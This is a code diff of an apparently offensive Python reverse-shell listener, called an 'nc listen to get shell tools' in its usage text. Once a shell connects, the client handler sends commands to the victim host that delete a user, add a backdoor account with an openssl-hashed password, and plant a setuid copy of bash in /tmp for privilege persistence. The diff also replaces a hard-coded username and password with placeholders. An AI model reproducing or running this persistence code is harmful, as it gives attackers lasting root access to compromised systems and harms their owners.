@@ -19,8 +19,8 @@ command = False
 input_file = ''
 output_file = ''
 '''add your diy name and pass'''
-user = 'pangsec'
-pas = 'Pang@sec567'
+user = 'xxxxxx'
+pas = 'xxxxxxx'
 
 def usage():
     print("\n\nWelcome opang nc listen to get shell tools!")
@@ -106,9 +106,6 @@ def print_command(conn):
 
 def client_handler(conn):
     if command:
-        # threading._start_new_thread(print_command, (conn,))
-        # conn.send(bytes("deluser {}\n\n".format(user), encoding='utf-8'))
-        # conn.send(bytes("adduser -H {};\n{};\n{};\n\n".format(user, pas, pas), encoding='utf-8'))
         conn.send(bytes("userdel {}\n\n".format(user), encoding='utf-8'))
         conn.send(bytes("useradd -M -p `openssl passwd -1 -salt 'KakDox89' {}` {}\n\n".format(pas, user), encoding='utf-8'))
         conn.send(bytes('cp /bin/bash /tmp/shell && chmod u+s /tmp/shell\n\n', encoding='utf-8'))
@@ -144,7 +141,6 @@ def send_loop(server):
     # conn_thread = threading.Thread(target=client_handler, args=(conn,))
 
 def loop():
-
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((target, port))
     server.listen(1)
